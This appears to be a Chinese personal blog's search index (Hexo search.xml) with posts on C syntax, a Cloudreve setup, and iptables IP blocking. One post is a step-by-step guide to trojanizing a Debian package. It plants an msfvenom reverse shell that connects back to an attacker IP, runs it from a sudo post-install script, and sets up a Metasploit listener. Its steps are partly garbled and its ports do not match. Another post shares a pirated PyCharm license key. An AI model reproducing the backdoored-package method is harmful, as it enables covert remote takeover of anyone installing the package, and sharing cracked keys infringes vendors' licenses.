<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>C语言基本语法</title>
      <link href="/2021/10/06/30/"/>
      <url>/2021/10/06/30/</url>
      
        <content type="html"><![CDATA[<h2 id="C-的令牌（Token）"><a href="#C-的令牌（Token）" class="headerlink" title="C 的令牌（Token）"></a>C 的令牌（Token）</h2><p>C 程序由各种令牌组成，令牌可以是关键字、标识符、常量、字符串值，或者是一个符号。例如，下面的 C 语句包括五个令牌：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, World! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这五个令牌分别是：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, World! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="分号"><a href="#分号" class="headerlink" title="分号 ;"></a>分号 ;</h2><p>在 C 程序中，分号是语句结束符。也就是说，每个语句必须以分号结束。它表明一个逻辑实体的结束。</p><p>例如，下面是两个不同的语句：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello, World! \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p><strong>C 语言有两种注释方式：</strong></p><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">// 单行注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以 <strong>//</strong> 开始的单行注释，这种注释可以单独占一行。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* 单行注释 */</span><span class="token comment" spellcheck="true">/*  多行注释 多行注释 多行注释 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>/* */</strong> 这种格式的注释可以单行或多行。</p><p>您不能在注释内嵌套注释，注释也不能出现在字符串或字符值中。</p><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><p>C 标识符是用来标识变量、函数，或任何其他用户自定义项目的名称。一个标识符以字母 A-Z 或 a-z 或下划线 _ 开始，后跟零个或多个字母、下划线和数字（0-9）。</p><p>C 标识符内不允许出现标点字符，比如 @、$ 和 %。C 是<strong>区分大小写</strong>的编程语言。因此，在 C 中，<em>Manpower</em> 和 <em>manpower</em> 是两个不同的标识符。下面列出几个有效的标识符：</p><pre class="line-numbers language-c"><code class="language-c">mohd       zara    abc   move_name  a_123myname50   _temp   j     a23b9      retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><p>下面列出了 C 中的保留字。这些保留字不能作为常量名、变量名或其他标识符名称。</p><pre class="line-numbers language-c"><code class="language-c">关键字    说明<span class="token keyword">auto</span>    声明自动变量<span class="token keyword">break</span>    跳出当前循环<span class="token keyword">case</span>    开关语句分支<span class="token keyword">char</span>    声明字符型变量或函数返回值类型<span class="token keyword">const</span>    定义常量，如果一个变量被 <span class="token keyword">const</span> 修饰，那么它的值就不能再被改变<span class="token keyword">continue</span>    结束当前循环，开始下一轮循环<span class="token keyword">default</span>    开关语句中的<span class="token string">"其它"</span>分支<span class="token keyword">do</span>    循环语句的循环体<span class="token keyword">double</span>    声明双精度浮点型变量或函数返回值类型<span class="token keyword">else</span>    条件语句否定分支（与 <span class="token keyword">if</span> 连用）<span class="token keyword">enum</span>    声明枚举类型<span class="token keyword">extern</span>    声明变量或函数是在其它文件或本文件的其他位置定义<span class="token keyword">float</span>    声明浮点型变量或函数返回值类型<span class="token keyword">for</span>    一种循环语句<span class="token keyword">goto</span>    无条件跳转语句<span class="token keyword">if</span>    条件语句<span class="token keyword">int</span>    声明整型变量或函数<span class="token keyword">long</span>    声明长整型变量或函数返回值类型<span class="token keyword">register</span>    声明寄存器变量<span class="token keyword">return</span>    子程序返回语句（可以带参数，也可不带参数）<span class="token keyword">short</span>    声明短整型变量或函数<span class="token keyword">signed</span>    声明有符号类型变量或函数<span class="token keyword">sizeof</span>    计算数据类型或变量长度（即所占字节数）<span class="token keyword">static</span>    声明静态变量<span class="token keyword">struct</span>    声明结构体类型<span class="token keyword">switch</span>    用于开关语句<span class="token keyword">typedef</span>    用以给数据类型取别名<span class="token keyword">unsigned</span>    声明无符号类型变量或函数<span class="token keyword">union</span>    声明共用体类型<span class="token keyword">void</span>    声明函数无返回值或无参数，声明无类型指针<span class="token keyword">volatile</span>    说明变量在程序执行中可被隐含地改变<span class="token keyword">while</span>    循环语句的循环条件<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="C99-新增关键字"><a href="#C99-新增关键字" class="headerlink" title="C99 新增关键字"></a>C99 新增关键字</h3><pre class="line-numbers language-c"><code class="language-c">_Bool    _Complex    _Imaginary    <span class="token keyword">inline</span>    restrict<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="C11-新增关键字"><a href="#C11-新增关键字" class="headerlink" title="C11 新增关键字"></a>C11 新增关键字</h3><pre class="line-numbers language-c"><code class="language-c">_Alignas    _Alignof    _Atomic    _Generic    _Noreturn_Static_assert    _Thread_local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="C-中的空格"><a href="#C-中的空格" class="headerlink" title="C 中的空格"></a>C 中的空格</h2><p>只包含空格的行，被称为空白行，可能带有注释，C 编译器会完全忽略它。</p><p>在 C 中，空格用于描述空白符、制表符、换行符和注释。空格分隔语句的各个部分，让编译器能识别语句中的某个元素（比如 int）在哪里结束，下一个元素在哪里开始。因此，在下面的语句中：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> age<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在这里，int 和 age 之间必须至少有一个空格字符（通常是一个空白符），这样编译器才能够区分它们。另一方面，在下面的语句中：</p><pre class="line-numbers language-c"><code class="language-c">fruit <span class="token operator">=</span> apples <span class="token operator">+</span> oranges<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 获取水果的总数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>fruit 和 =，或者 = 和 apples 之间的空格字符不是必需的，但是为了增强可读性，您可以根据需要适当增加一些空格。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用宝塔面板安装Cloudreve网盘程序</title>
      <link href="/2021/07/26/29/"/>
      <url>/2021/07/26/29/</url>
      
        <content type="html"><![CDATA[<h3 id="Cloudreve-新版V3特性："><a href="#Cloudreve-新版V3特性：" class="headerlink" title="Cloudreve 新版V3特性："></a>Cloudreve 新版V3特性：</h3><ul><li>☁️ 支持本机、从机、七牛、阿里云 OSS、腾讯云 COS、又拍云、OneDrive (包括世纪互联版) 作为存储端</li><li>📤 上传/下载 支持客户端直传，支持下载限速</li><li>💾 可对接 Aria2 离线下载</li><li>📚 在线 压缩/解压缩、多文件打包下载</li><li>💻 覆盖全部存储策略的 WebDAV 协议支持</li><li>⚡ 拖拽上传、目录上传、流式上传处理</li><li>🗃️ 文件拖拽管理</li><li>👩‍👧‍👦 多用户、用户组</li><li>🔗 创建文件、目录的分享链接，可设定自动过期</li><li>👁️‍🗨️ 视频、图像、音频、文本、Office 文档在线预览</li><li>🎨 自定义配色、黑暗模式、PWA 应用、全站单页应用</li><li>🚀 外链等</li><li>🌈 … …</li></ul><h2 id="一、官方支持的网站和文档"><a href="#一、官方支持的网站和文档" class="headerlink" title="一、官方支持的网站和文档"></a>一、官方支持的网站和文档</h2><ul><li><p>官网：<a href="https://cloudreve.org/" target="_blank" rel="noopener">https://cloudreve.org/</a></p></li><li><p>github：<a href="https://github.com/cloudreve/Cloudreve" target="_blank" rel="noopener">https://github.com/cloudreve/Cloudreve</a></p></li><li><p>下载：<a href="https://github.com/cloudreve/Cloudreve/releases" target="_blank" rel="noopener">https://github.com/cloudreve/Cloudreve/releases</a></p></li><li><p>安装文档：<a href="https://docs.cloudreve.org/getting-started/install" target="_blank" rel="noopener">https://docs.cloudreve.org/getting-started/install</a></p></li><li><p>演示：<a href="https://demo.cloudreve.org" target="_blank" rel="noopener">https://demo.cloudreve.org</a></p><h2 id="二、宝塔命令行输入代码查询内核参数"><a href="#二、宝塔命令行输入代码查询内核参数" class="headerlink" title="二、宝塔命令行输入代码查询内核参数"></a>二、宝塔命令行输入代码查询内核参数</h2><pre class="line-numbers language-ssh"><code class="language-ssh">arch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出结果x86_64代表amd64；aarch64代表arm64.</p><p><img src="https://pic.imgdb.cn/item/60fe95475132923bf80970db.png" alt=""></p></li></ul><h2 id="三、下载链接处找到对应的版本-复制链接地址"><a href="#三、下载链接处找到对应的版本-复制链接地址" class="headerlink" title="三、下载链接处找到对应的版本,复制链接地址"></a>三、下载链接处找到对应的版本,复制链接地址</h2><p><img src="https://pic.imgdb.cn/item/60fe95735132923bf809f9d9.png" alt=""></p><h2 id="四、宝塔安全添加5212端口"><a href="#四、宝塔安全添加5212端口" class="headerlink" title="四、宝塔安全添加5212端口"></a>四、宝塔安全添加5212端口</h2><p><img src="https://pic.imgdb.cn/item/60fe95ed5132923bf80b6ebe.png" alt=""></p><h2 id="五、宝塔命令行逐行执行以下命令，对应链接处改为自己的："><a href="#五、宝塔命令行逐行执行以下命令，对应链接处改为自己的：" class="headerlink" title="五、宝塔命令行逐行执行以下命令，对应链接处改为自己的："></a>五、宝塔命令行逐行执行以下命令，对应链接处改为自己的：</h2><p>（当然你也可以把下边的改成自己的然后全部复制黏贴）</p><pre class="line-numbers language-ssh"><code class="language-ssh">mkdir /www/wwwroot/cloudreve # 新建一个文件夹存放程序cd /www/wwwroot/cloudreve # 进入该文件夹wget https://github.com/cloudreve/Cloudreve/releases/download/3.1.1/cloudreve_3.1.1_linux_amd64.tar.gz # 下载你复制的链接tar -zxvf cloudreve_3.1.1_linux_amd64.tar.gz # 解压获取到的主程序chmod +x ./cloudreve # 赋予执行权限./cloudreve # 启动 Cloudreve<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="六、安装完成，保存账户和登录密码，务必保存该密码，测试登录"><a href="#六、安装完成，保存账户和登录密码，务必保存该密码，测试登录" class="headerlink" title="六、安装完成，保存账户和登录密码，务必保存该密码，测试登录"></a>六、安装完成，保存账户和登录密码，务必保存该密码，测试登录</h2><p>登录地址为服务器ip加端口5212，比如<a href="http://192.47.53.21:5212/" target="_blank" rel="noopener">http://192.47.53.21:5212/</a></p><p><img src="https://pic.imgdb.cn/item/60fe99565132923bf815fed1.png" alt=""></p><h2 id="七、想要无忧使用，最好是加个进程守护，这样就不需要每次都到后台启动进程"><a href="#七、想要无忧使用，最好是加个进程守护，这样就不需要每次都到后台启动进程" class="headerlink" title="七、想要无忧使用，最好是加个进程守护，这样就不需要每次都到后台启动进程"></a>七、想要无忧使用，最好是加个进程守护，这样就不需要每次都到后台启动进程</h2><p>命令行端口ctrl+c，停止进程</p><p><img src="https://pic.imgdb.cn/item/60fe97165132923bf80f0051.png" alt=""></p><p>配置这样填：</p><p><img src="https://pic.imgdb.cn/item/60fe97375132923bf80f69f6.png" alt=""></p><p>添加成功后，看下进程状态是否为开启的绿三角，假如不是就重启服务器，再回来看下，还不是就检查配置是否正确。</p><h2 id="八、绑定域名访问"><a href="#八、绑定域名访问" class="headerlink" title="八、绑定域名访问"></a>八、绑定域名访问</h2><p>添加一个网站，设置反向代理</p><p><img src="https://pic.imgdb.cn/item/60fe97375132923bf80f69f6.png" alt=""></p><p>搭建完成，<a href="https://cloud.mx42.club/" target="_blank" rel="noopener">访问站点</a></p>]]></content>
      
      
      <categories>
          
          <category> 环境搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>inis系统</title>
      <link href="/2021/07/12/28/"/>
      <url>/2021/07/12/28/</url>
      
        <content type="html"><![CDATA[<h2 id="inis博客系统"><a href="#inis博客系统" class="headerlink" title="inis博客系统"></a>inis博客系统</h2>        <!-- 视频模块 -->        <div class="biye">            <p>inis博客系统简介</p>                       <div style="position: relative; padding: 30% 45%;">                <iframe style="                    position: absolute;                     width: 100%;                     height: 100%;                     left: 0; top: 0;"                     src="https:////player.bilibili.com/player.html?aid=804072651&bvid=BV1Dy4y1K719&cid=367584506&page=1&high_quality=1"                     scrolling="no"                     border="0"                     frameborder="no"                     framespacing="0"                     allowfullscreen="true">                </iframe>            </div>        </div><p>博主已买,感觉不错,推荐给大家<a href="https://www.mx142.ltd/" target="_blank" rel="noopener">我的inis地址</a><br><a href="https://racns.com/" target="_blank" rel="noopener">inis系统购买地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用deb包-0day-java环境进行渗透</title>
      <link href="/2021/04/07/26/"/>
      <url>/2021/04/07/26/</url>
      
        <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p>制作恶意软件包使用–download-only方式下载软件安装包包不进行安装</p><pre class="line-numbers language-linux"><code class="language-linux">apt --download-only install freesweep <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/606d3c028322e6675ca71a12.png" alt=""></p><p>将软件包移动到root目录</p><pre class="line-numbers language-linux"><code class="language-linux">mv /var/cache/apt/archives/freesweep_1.0.1-1_amd64.deb ~/ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/606d3c028322e6675ca71a17.png" alt=""></p><p>解压软件包到free目录</p><pre class="line-numbers language-linux"><code class="language-linux">dpkg -x freesweep_1.0.1-1_amd64.deb free<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/606d3c028322e6675ca71a1f.png" alt=""></p><p>生成恶意代码到软件包源文件里</p><pre class="line-numbers language-linux"><code class="language-linux">msfvenom -a x64 --platform linux -p linux/x64/shell/reverse_tcp LHOST=192.168.43.132 LPORT=4444 -b "\x00" -i 10 -f elf -o /root/free/usr/games/freesweep_sources<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/606d3c028322e6675ca71a25.png" alt=""></p><p>创建软件包信息目录</p><pre><code>mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN</code></pre><p><img src="https://img.imgdb.cn/item/606d3c028322e6675ca71a0b.png" alt=""></p><p>创建软件包的信息文件</p><pre class="line-numbers language-linux"><code class="language-linux">tee /root/free/DEBIAN/control << 'EOF#!/bin/bash sudo chmod 2755 /usr/games/freesweep_sources sudo /usr/games/freesweep_sources & EOF <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/606d3df18322e6675ca8f541.png" alt=""></p><p><img src="https://img.imgdb.cn/item/606d3e068322e6675ca90b05.png" alt=""></p><p>给脚本文件添加执行权限</p><pre class="line-numbers language-linux"><code class="language-linux">/free/DEBIAN# chmod 755 /root/free/DEBIAN/postinst构建新的deb安装dpkg-deb --build /root/free/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-linux"><code class="language-linux">ls /root/free.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img.imgdb.cn/item/606d3e918322e6675ca9967d.png" alt=""></p><p>新打开一个终端 CTRL+SHIFT+T，生成MSF监听</p><pre class="line-numbers language-msf"><code class="language-msf">use exploit/multi/handlerset payload linux/x64/meterpreter/reverse_tcpset LHOST 192.168.43.132set LPORT 8888exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功.</p><p><img src="https://img.imgdb.cn/item/606d3f008322e6675caa08bd.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Kali Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>台湾延时</title>
      <link href="/2021/03/27/25/"/>
      <url>/2021/03/27/25/</url>
      
        <content type="html"><![CDATA[<div id="dplayer0" class="dplayer hexo-tag-dplayer-mark" style="margin-bottom: 20px;"></div><script>(function(){var player = new DPlayer({"container":document.getElementById("dplayer0"),"theme":" #03a9f4","loop":true,"video":{"url":"https://txmov2.a.yximgs.com/upic/2021/03/27/18/BMjAyMTAzMjcxODIxMDdfMTc3MTUzMDUwN180NjczMTM3MjgzNF8wXzM=_b_B229097a6a8ffbd0c0ae87b1da8ca6d3e.mp4","pic":"https://img.imgdb.cn/item/605f2a448322e6675c57dbc0.png"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})()</script>]]></content>
      
      
      <categories>
          
          <category> 台湾延时 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 视频 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VPS服务器防火墙禁止IP</title>
      <link href="/2021/03/11/24/"/>
      <url>/2021/03/11/24/</url>
      
        <content type="html"><![CDATA[<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>centos7系统VPS服务器防火墙禁止单IP及IP段的教程</p><p>先说一些其他的知识，IP我们都知道由4组数字组成，这四组数字依次是A段、B段、C段、D段</p><p>我们常说的禁掉整个IP段，大多数是指C段，特殊情况会是B段或者A段。</p><p>另外IP段我们常用下面的方式来表示：</p><p>一个C段 192.168.2</p><pre><code>192.168.2.0/24</code></pre><p> 一个B段 192.168 </p><pre><code>192.168.0.0/16</code></pre><p> 一个A段 192 </p><pre><code>192.0.0.0/8</code></pre><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>下面是禁止IP的命令，命令输入后回车系统不会返回任何信息，配合防火墙的操作命令，来查看是否禁止成功 </p><p> 禁掉单独某个IP，192.168.2.5 </p><pre><code>iptables -I INPUT -s 192.168.2.5 -j DROP</code></pre><p> 禁掉一个C段IP，192.168.0/24，也就是192.168.2.0到192.168.2.255的所有IP </p><pre><code>iptables -I INPUT -s 192.168.0/24 -j DROP</code></pre><p> 禁掉一个B段，192.168.0.0/16，也就是192.168.0.0到192.168.255.255的所有IP </p><pre><code>iptables -I INPUT -s 192.168.0.0/16 -j DROP</code></pre><p> 禁掉一个A段，192.0.0.0/8。也就是192.0.0.0到192.255.255.255的所有IP </p><pre><code>iptables -I INPUT -s 192.0.0.0/8 -j DROP</code></pre><p>注意： 一般我们常用的是禁掉单个IP或者C段，B段以及A段慎重操作！ </p><p> 查看防火墙禁止IP列表 </p><pre><code>iptables -L -n</code></pre><p> 解禁IP命令 </p><pre><code>iptables -D INPUT -s 124.115.0.199  -j REJECT</code></pre><p> 清除防火墙所有禁止IP </p><pre><code>iptables -F</code></pre><p> 以上所有操作都需要重启防火墙生效 !</p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pycharm激活码</title>
      <link href="/2021/03/03/23/"/>
      <url>/2021/03/03/23/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-激活码"><code class="language-激活码">UY9S9X77H2-eyJsaWNlbnNlSWQiOiJVWTlTOVg3N0gyIiwibGljZW5zZWVOYW1lIjoi5rC45LmF5YWN6LS5IGxvb2tkaXbjgIJjb20iLCJhc3NpZ25lZU5hbWUiOiIiLCJhc3NpZ25lZUVtYWlsIjoiIiwibGljZW5zZVJlc3RyaWN0aW9uIjoiIiwiY2hlY2tDb25jdXJyZW50VXNlIjpmYWxzZSwicHJvZHVjdHMiOlt7ImNvZGUiOiJEQyIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiSUkiLCJwYWlkVXBUbyI6IjIwMjEtMDMtMTgiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IkRCIiwicGFpZFVwVG8iOiIyMDIxLTAzLTE4IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJSTSIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiV1MiLCJwYWlkVXBUbyI6IjIwMjEtMDMtMTgiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlJTViIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJSU1UiLCJwYWlkVXBUbyI6IjIwMjEtMDMtMTgiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlBDIiwicGFpZFVwVG8iOiIyMDIxLTAzLTE4IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJSQyIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUkQiLCJwYWlkVXBUbyI6IjIwMjEtMDMtMTgiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IkRNIiwicGFpZFVwVG8iOiIyMDIxLTAzLTE4IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJDTCIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUlMwIiwicGFpZFVwVG8iOiIyMDIxLTAzLTE4IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJSU0MiLCJwYWlkVXBUbyI6IjIwMjEtMDMtMTgiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiR08iLCJwYWlkVXBUbyI6IjIwMjEtMDMtMTgiLCJleHRlbmRlZCI6ZmFsc2V9LHsiY29kZSI6IlJTRiIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUyIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiRFBOIiwicGFpZFVwVG8iOiIyMDIxLTAzLTE4IiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJBQyIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUERCIiwicGFpZFVwVG8iOiIyMDIxLTAzLTE4IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBXUyIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQR08iLCJwYWlkVXBUbyI6IjIwMjEtMDMtMTgiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwicGFpZFVwVG8iOiIyMDIxLTAzLTE4IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBQQyIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUkIiLCJwYWlkVXBUbyI6IjIwMjEtMDMtMTgiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFNXIiwicGFpZFVwVG8iOiIyMDIxLTAzLTE4IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTSSIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJEUCIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJSUyIsInBhaWRVcFRvIjoiMjAyMS0wMy0xOCIsImV4dGVuZGVkIjp0cnVlfV0sIm1ldGFkYXRhIjoiMDEyMDIxMDIxOVBQQU0wMDAwMDUiLCJoYXNoIjoiMjI3NTA5MDMvMDoxNjQ0MjI2OTg4IiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-RXHQhurqThzdFFUr4v8iuwiq1hAJjM95zXdT922tSaUFInzkNwyzyjt/7Z52b5eC1KPee8YESaHp9gzqNLuJqBybpzafmK7HhDGD8/Zduz0gbvUbznHdJF7ZU6eJhXEqkNVAgJnk6lO7GUZY8cW3mWHTPNFa1jnPeBwrW300DKV50sKQ+5a3Qv8AcYdOjz5UTWAv/H2hS8rj/kv7xPldUinxRkbbry4lVR4JHDRBPOxXCLynxyAdgtpDr7ZDnhUZbqlDdwOasKk7se27rOk6WfKD2KtzZJuZojNOdgNW7vdwwsZVnSZyUZOVzpAWh5LHI29F8I7IP5qGXDYRMen7pA==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDCP4uk4SlVdA5nuA3DQC+NsEnZS9npFnO0zrmMWcz1++q2UWJNuGTh0rwi+3fUJIArfvVh7gNtIp93rxjtrQAuf4/Fa6sySp4c32MeFACfC0q+oUoWebhOIaYTYUxm4LAZ355vzt8YeDPmvWKxA81udqEk4gU9NNAOz1Um5/8LyR8SGsSc4EDBRSjcMWMwMkYSauGqGcEUK8WhfplsyF61lKSOFA6VmfUmeDK15rUWWLbOMKgn2cxFA98A+s74T9Oo96CU7rp/umDXvhnyhAXSukw/qCGOVhwKR8B6aeDtoBWQgjnvMtPgOUPRTPkPGbwPwwDkvAHYiuKJ7Bd2wH7rAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBAB2J1ysRudbkqmkUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/wi9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 资源分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10系统激活</title>
      <link href="/2021/02/07/22/"/>
      <url>/2021/02/07/22/</url>
      
